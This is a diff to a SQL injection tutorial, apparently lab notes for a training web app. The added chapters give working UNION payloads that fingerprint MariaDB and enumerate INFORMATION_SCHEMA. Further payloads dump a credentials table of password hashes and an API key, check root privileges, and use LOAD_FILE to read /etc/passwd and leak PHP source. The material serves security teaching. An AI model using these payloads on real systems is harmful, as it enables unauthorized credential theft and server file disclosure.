@@ -29,7 +29,11 @@
 - Un-even Columns
 ### 💉 Chapter 11: Union Injection
 - Finding the Injection / Detecting Columns / Location of Injection
-### 📋 Chapter 12: Command Reference
+### 📚 Chapter 12: Database Enumeration
+- MySQL Fingerprinting / INFORMATION_SCHEMA / SCHEMATA / TABLES / COLUMNS / Data
+### 📂 Chapter 13: Reading Files
+- Privileges / DB User / User Privileges / LOAD_FILE
+### 📋 Chapter 14: Command Reference
 
 ---
 
@@ -2601,6 +2605,518 @@ The version prints in the reflected column. We now know how to form UNION payloa
 ---
 
 <details>
+<summary><h2>📚 Database Enumeration</h2></summary>
+
+With UNION injection working, we can put every earlier query to use — gathering real data from the database through the injection. First fingerprint the DBMS, then walk its metadata to locate and dump the data we want.
+
+<details>
+<summary><h3>MySQL Fingerprinting</h3></summary>
+
+Each DBMS speaks slightly different SQL, so before enumerating we identify **which** one we hit — that tells us which queries to use.
+
+A rough first guess from the web server: Apache / Nginx → likely Linux → likely **MySQL**; IIS → likely Windows → likely **MSSQL**. Weak signal though — any DB can run on any stack. Better to fingerprint with probe queries:
+
+| Payload | When to Use | Expected Output | Wrong Output |
+|---|---|---|---|
+| `SELECT @@version` | Full query output | MySQL version (e.g. `10.3.22-MariaDB-1ubuntu1`) | MSSQL → MSSQL version; error on other DBMS |
+| `SELECT POW(1,1)` | Only numeric output | `1` | Error on other DBMS |
+| `SELECT SLEEP(5)` | Blind / no output | Delays response 5s, returns `0` | No delay on other DBMS |
+
+From the previous section, `@@version` already gave us the answer:
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION select 1,@@version,3,4-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| 10.3.22-MariaDB-1ubuntu1 | 3 | 4 |
+
+</td></tr>
+</table>
+
+Output `10.3.22-MariaDB-1ubuntu1` → **MariaDB** (a MySQL fork). Direct output, so no need for the other probes.
+
+</details>
+
+<details>
+<summary><h3>INFORMATION_SCHEMA Database</h3></summary>
+
+To form `UNION SELECT` queries that dump data, we need three things:
+
+- List of **databases**
+- List of **tables** in each database
+- List of **columns** in each table
+
+`INFORMATION_SCHEMA` — a metadata database describing every database and table on the server — holds all of it. It is a **separate** database, so we cannot call its tables directly: a bare table name is resolved inside the current database. To reach another database's table, use the dot (`.`) operator:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL</b> </td></tr>
+<tr><td>
+
+```sql
+SELECT * FROM my_database.users;
+```
+
+</td></tr>
+</table>
+
+Same operator lets us read `INFORMATION_SCHEMA`'s tables.
+
+<details>
+<summary><h4>SCHEMATA — List Databases</h4></summary>
+
+The `SCHEMATA` table lists every database; its `SCHEMA_NAME` column holds the names. Locally:
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
+
+```sql
+SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
++--------------------+
+| SCHEMA_NAME        |
++--------------------+
+| mysql              |
+| information_schema |
+| performance_schema |
+| ilfreight          |
+| dev                |
++--------------------+
+6 rows in set (0.01 sec)
+```
+
+</td></tr>
+</table>
+
+> **NOTE:** `mysql`, `information_schema`, `performance_schema` (and sometimes `sys`) are default databases — ignore them during enumeration. The interesting ones here are `ilfreight` and `dev`.
+
+Same via UNION injection:
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| information_schema | 3 | 4 |
+| ilfreight | 3 | 4 |
+| dev | 3 | 4 |
+| performance_schema | 3 | 4 |
+| mysql | 3 | 4 |
+
+</td></tr>
+</table>
+
+`ilfreight` and `dev` again. Which one backs the app? `database()` returns the current database:
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION select 1,database(),2,3-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| ilfreight | 2 | 3 |
+
+</td></tr>
+</table>
+
+App runs on `ilfreight` — but `dev` looks more interesting. Enumerate it.
+
+</details>
+
+<details>
+<summary><h4>TABLES — List Tables</h4></summary>
+
+The `TABLES` table lists all tables; the `TABLE_NAME` column holds names, `TABLE_SCHEMA` holds the owning database. Filter to `dev`:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+```
+
+</td></tr>
+</table>
+
+We swapped junk `2` and `3` for `TABLE_NAME` and `TABLE_SCHEMA` to print both in one query.
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| credentials | dev | 4 |
+| posts | dev | 4 |
+| framework | dev | 4 |
+| pages | dev | 4 |
+
+</td></tr>
+</table>
+
+> **NOTE:** The `where table_schema='dev'` filter limits output to the `dev` database — without it we would get every table on the server.
+
+Four tables in `dev`: `credentials`, `posts`, `framework`, `pages`. `credentials` looks worth dumping.
+
+</details>
+
+<details>
+<summary><h4>COLUMNS — List Columns</h4></summary>
+
+Before dumping `credentials`, get its column names from the `COLUMNS` table (`COLUMN_NAME`, `TABLE_NAME`, `TABLE_SCHEMA`). Filter to `table_name='credentials'`:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+```
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| username | credentials | dev |
+| password | credentials | dev |
+
+</td></tr>
+</table>
+
+Two columns: `username` and `password`.
+
+</details>
+
+<details>
+<summary><h4>Data — Dump the Table</h4></summary>
+
+With database, table, and columns known, dump `username` and `password` from `dev.credentials` — place them in the reflected columns 2 and 3:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+cn' UNION select 1, username, password, 4 from dev.credentials-- -
+```
+
+</td></tr>
+</table>
+
+> **Remember:** Use the dot operator (`dev.credentials`) — the app runs in `ilfreight`, so a bare `credentials` would not resolve.
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION select 1, username, password, 4 from dev.credentials-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | 4 |
+| dev_admin | 47e761039fd8ba3705d38142eaffbdd5 | 4 |
+| api_key | MzkyMDM3ZGJiYTUxZjY5Mjc3NmQyY2VmYjZkZDU0NmQgIC0K | 4 |
+
+</td></tr>
+</table>
+
+Full `credentials` dump — password hashes plus an API key. Next step: crack the hashes or reuse the key.
+
+</details>
+
+</details>
+
+</details>
+
+---
+
+<details>
+<summary><h2>📂 Reading Files</h2></summary>
+
+Beyond dumping tables, SQL injection can read and write files on the server — and from there reach remote code execution. Reading is far more common than writing (writing is locked to privileged users), so start by checking what our DB user is allowed to do.
+
+<details>
+<summary><h3>Privileges</h3></summary>
+
+In MySQL, reading files needs the **`FILE`** privilege — it lets a user load a file's contents into a table and dump it back. Before trying, gather who we are and what we can do.
+
+<details>
+<summary><h4>DB User</h4></summary>
+
+First, identify the current DB user. DBA (admin) rights make file-read far more likely. Any of these return the current user:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL</b> </td></tr>
+<tr><td>
+
+```sql
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user FROM mysql.user
+```
+
+</td></tr>
+</table>
+
+As a UNION injection:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+cn' UNION SELECT 1, user(), 3, 4-- -
+```
+
+</td></tr>
+</table>
+
+or, pulling from `mysql.user`:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+cn' UNION SELECT 1, user, 3, 4 FROM mysql.user-- -
+```
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION SELECT 1, user(), 3, 4-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| root@localhost | 3 | 4 |
+
+</td></tr>
+</table>
+
+Current user is `root` — promising, as `root` is likely a DBA with broad privileges.
+
+</details>
+
+<details>
+<summary><h4>User Privileges</h4></summary>
+
+Knowing the user, check the privileges. Test superuser rights with `super_priv`:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+```
+
+</td></tr>
+</table>
+
+> **TIP:** With many DB users, add `WHERE user="root"` to show only the current user: `... FROM mysql.user WHERE user="root"-- -`.
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| Y | 3 | 4 |
+
+</td></tr>
+</table>
+
+`Y` = **YES** → superuser. Dump the full privilege list from `information_schema.user_privileges`:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+```
+
+</td></tr>
+</table>
+
+> **TIP:** Filter to the current user with `WHERE grantee="'root'@'localhost'"`.
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| 'root'@'localhost' | SELECT | 4 |
+| 'root'@'localhost' | INSERT | 4 |
+| 'root'@'localhost' | UPDATE | 4 |
+| 'root'@'localhost' | DELETE | 4 |
+| 'root'@'localhost' | CREATE | 4 |
+| 'root'@'localhost' | DROP | 4 |
+| 'root'@'localhost' | RELOAD | 4 |
+| 'root'@'localhost' | SHUTDOWN | 4 |
+| 'root'@'localhost' | PROCESS | 4 |
+| 'root'@'localhost' | FILE | 4 |
+
+</td></tr>
+</table>
+
+**`FILE`** is listed → we can read (and potentially write) files. Proceed to file read.
+
+</details>
+
+</details>
+
+<details>
+<summary><h3>LOAD_FILE</h3></summary>
+
+`LOAD_FILE()` reads a file's contents in MySQL / MariaDB. It takes one argument — the file path:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL</b> </td></tr>
+<tr><td>
+
+```sql
+SELECT LOAD_FILE('/etc/passwd');
+```
+
+</td></tr>
+</table>
+
+> **NOTE:** The read succeeds only if the OS user running MySQL can read the target file.
+
+As a UNION injection:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+```
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -`
+
+Reflected in the **Port Code** column:
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin
+```
+
+</td></tr>
+</table>
+
+We read `/etc/passwd` through the injection. Same trick can leak application source code.
+
+<details>
+<summary><h4>Another Example — Leaking Source</h4></summary>
+
+The current page is `search.php`; the default Apache webroot is `/var/www/html`. Read its own source:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+```
+
+</td></tr>
+</table>
+
+The browser **renders** the returned HTML instead of showing it. View the raw source with `Ctrl + U`:
+
+<table width="100%">
+<tr><td> 📄 <b>search.php — leaked source</b> </td></tr>
+<tr><td>
+
+```php
+<?php
+if (isset($_GET["port_code"])) {
+$q = "Select * from ports where code like '%".$_GET["port_code"]."%'";
+
+$result = mysqli_query($conn,$q);
+if (!$result)
+{
+        die("</table></div><p style='font-size: 15px'>".mysqli_error($conn)."</p>");
+}
+while($row = mysqli_fetch_array($result))
+  {
+  echo "<tr><td style=\"width:400px\" colspan=3>".$row[1]."</td><td style=\"width:400px\" colspan=3>".$row[2]."</td></tr>";
+  }
+}
+?>
+```
+
+</td></tr>
+</table>
+
+Full PHP source — the query is built by concatenating `$_GET["port_code"]` straight into the `LIKE` clause (the root cause), and the file could hold DB credentials or point to more vulnerabilities.
+
+</details>
+
+</details>
+
+</details>
+
+---
+
+<details>
 <summary><h2>📋 Command Reference</h2></summary>
 
 Quick reference of the statements covered so far — this table will grow as more commands are added.
@@ -2641,6 +3157,19 @@ Quick reference of the statements covered so far — this table will grow as mor
 | `' ORDER BY <n>-- -` | Detect column count — increment `<n>` until it errors (last success = column count) |
 | `cn' UNION SELECT 1,2,3,4-- -` | Detect column count / reflected positions — numbers map to printed columns |
 | `cn' UNION SELECT 1,@@version,3,4-- -` | Confirm data extraction — print DB version in a reflected column |
+| `SELECT @@version` | Fingerprint — MySQL/MariaDB version (full output) |
+| `SELECT POW(1,1)` | Fingerprint — MySQL via numeric output (returns `1`) |
+| `SELECT SLEEP(5)` | Fingerprint — MySQL blind (delays 5s, returns `0`) |
+| `SELECT database()` | Current database name |
+| `db.table` | Dot operator — reference a table in another database |
+| `... FROM INFORMATION_SCHEMA.SCHEMATA` | List all databases (`SCHEMA_NAME` column) |
+| `... FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='db'` | List tables in a database (`TABLE_NAME`) |
+| `... FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='t'` | List columns in a table (`COLUMN_NAME`) |
+| `SELECT USER()` / `CURRENT_USER()` | Current DB user |
+| `SELECT user FROM mysql.user` | List all DB users |
+| `SELECT super_priv FROM mysql.user` | Check superuser privilege (`Y`/`N`) |
+| `... FROM information_schema.user_privileges` | Dump user privileges (`grantee`, `privilege_type`) |
+| `LOAD_FILE('/path')` | Read a file's contents (needs `FILE` privilege) |
 | `SHOW GRANTS;` | View the current user's privileges |
 
 </details>
